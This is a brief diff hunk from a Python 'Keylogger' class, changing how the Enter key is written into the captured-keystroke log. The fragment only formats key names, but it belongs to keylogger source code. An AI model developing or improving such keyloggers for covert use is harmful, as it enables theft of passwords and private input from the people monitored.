@@ -31,7 +31,7 @@ class Keylogger:
                 name = "space"
             elif name == "enter":
                 # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
+                name = "[ENTER]"
             elif name == "decimal":
                 name = "."
             else:
